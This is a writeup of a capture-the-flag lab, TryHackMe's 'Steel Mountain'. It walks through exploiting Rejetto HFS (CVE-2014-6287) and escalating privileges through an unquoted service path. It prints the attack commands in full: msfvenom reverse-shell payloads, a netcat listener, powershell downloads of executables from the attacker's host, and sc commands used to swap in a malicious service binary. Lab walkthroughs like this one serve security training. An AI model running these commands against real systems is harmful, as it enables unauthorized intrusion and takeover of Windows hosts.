---
title: 'Steel Mountain 🗻'
excerpt: 'Featured writeup'
date: '2021-03-27T05:35:07.322Z'
author:
  name: Collin Orner
  picture: '/assets/blog/authors/collin.jpeg'
---


# Task 1 - Introduction

*Deploy the Machine.*

## Who is the employee of the month?

If you go to the IP of the website, you will see a picture of a man from Mr. Robot. If you watched the show, you may recognize him. I forgot his name, so I reverse searched the image to find his name.

**Answer:** **`Bill Harper`**

# Task 2 - Initial Access

## Scan the machine with nmap. What is the other port running a web server on?

I ran `nmap -sCV -A -Pn -vvv <ip>` to find the port running a http web server.

**Answer:** ``` 8080 ```

## Take a look at the other web server. What file is running?

After finding the port number from the nmap scan, I went to the url with the port number and found the server information at the bottom. I did some OSINT on the server version and found the exact name.

**Answer:** ``` Rejetto Http File Server ```

## What is the CVE number to exploit this file server?

Along with finding the file server running, on the same website it showed the CVE number. [https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

**Answer:** ``` 2014-6287 ```

## Use Metasploit to get an initial shell. What is the user flag?

run Metasploit with `msfconsole`

search for the exploit by typing in the CVE number with the command `search 2014-6287`

use the exploit with `use 0`

all you have to set is your RHOSTS and RPORT. Under the `show options` command it shows that there are a lot of required options but you only need those 2. 

I was getting an error saying, "This exploit may require manual cleanup of '%TEMP%\txVTS.vbs' on the target." To fix this, simply restart your box and get a new IP.

After running `exploit` I got a meterpreter shell within the metasploit console.

Running `pwd` I found by default I was put in the directory under the Users\bill, and figured I might check the Desktop.

On the Desktop there was a user.txt file, so I ran `cat user.txt` to get the flag

**Answer:** 
``` b04763b6fcf51fcd7c13abc7db4fd365 ```

# Task 3 - Privilege Escalation (With Metasploit)

## Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

Download the script from the box with `git clone https://github.com/PowerShellMafia/PowerSploit.git`

I put it into my TryHackMe folder for SteelMountain to keep it more organized. 

Go back to your meterpreter and upload it with `upload /home/kali/../PowerUp.ps1`

On the box it tells you to run `load powershell` in the meterpreter then `powershell_shell`

I checked to run the script with `./PowerUp.ps1` and it might've executed, but I checked for the CanRestart option with the command `invoke-allchecks` 

**Answer:** ``` AdvancedSystemCareService9 ```

## What is the root flag?

First, I made the reverse shell with the command given from the box `msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o Advanced.exe`

Then I went to the meterpreter and backgrounded the shell to load the exploit named `exploit/multi/handler` 

With this as my exploit, I set the payload to `windows/shell/reverse_tcp`

Make sure you match up the LHOST and LPORT to link with the reverse shell created with msfvenom. 

Run the exploit, and go into the old meterpreter with `sessions 0`

In here, cd into the Advanced SystemCare in the Program Files x86.

Open a shell with `shell` and stop the program with `sc stop AdvancedSystemCareService9` 

Exit out of this shell and upload the .exe you made with msfvenom into the Advanced SystemCare folder. 

Go back into the shell, and start the service with `sc start AdvancedSystemCareService9` 

This should launch the program with your executable making it so you can get root access. 

Look around in the root folder for the root.txt file.

**Answer:** ``` 9af5f314f57607c00fd09803a587db80 ```

# Task 4 - Access and Escalation Without Metasploit

First you want to get your exploit.

I searched for the exploit using searchsploit; `searchsploit rejetto http file server`

As you can see, the EDB-ID matches up with the searchsploit Exploit Title.

If you're on kali linux, it's already in your system so you can copy it over with `cp /usr/share/exploitdb/exploits/windows/remote/39161.py <filename.py>`

Nano into the .py file and set your local ip address to your openvpn IP.

Set the local port number to a port you will remember to run netcat with later on. 

On another tab in your terminal, start a SimpleHTTPServer with `sudo python -m SimpleHTTPServer <port>` (just use like port 80 or 8080)

On another tab in your terminal, start up that netcat listener on the port you put in the .py exploit file. `nc -lvnp <port>`

Run the exploit .py file with the command `python <filename>.py <target IP> 8080` 

If you get a 404 response in your Http Server, copy the ncat.exe to nc.exe, the script reads the listener as a different file name then what the box provides.

Once you get a 200 response message in the Http Server, run the exploit again and you should get a shell in your NC listener. 

## What powershell -c command could we run to manually find out the service name?

**Answer:** ``` powershell -c Get-Service ```

Now let's escalate to Administrator with our new found knowledge.

Download the WinPeas.exe file from the GitHub repo for privilege escalation. [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Obfuscated Releases/winPEASx64.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe)

With this, upload it to your target's machine with the new command you learned (powershell -c) `powershell -c wget "http://<local IP><port>/winPEASx64.exe" -outfile "winPEAS.exe"`

Run the file by simply typing the file name `winPEAS.exe`

Now, go back to your local host and make the ASCService.exe like we did with metasploit last task. `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o ASCService.exe` this will make the ASCService.exe on your local machine, and now you have to upload it to the target host.

Upload it with `powershell -c wget "http://<ip>:<port>/ASCService.exe -outfile "ASCService.exe"`

Now, just like in the Metasploit part, stop the service with `sc stop AdvancedSystemCareService9`

And then copy the .exe to the Advanced SystemCare with `copy ASCService.exe "Advanced SystemCare"`

Just start the service up again and your exploit will be encoded into the start. `sc start AdvancedSystemCareService`

Now you are root, the root.txt flag is right in the open it's not hard to find at all if you still need the root.txt flag. 

Congratulaions! You did the room. Thanks for reading my writeup! 🐦 **@collinhacks**

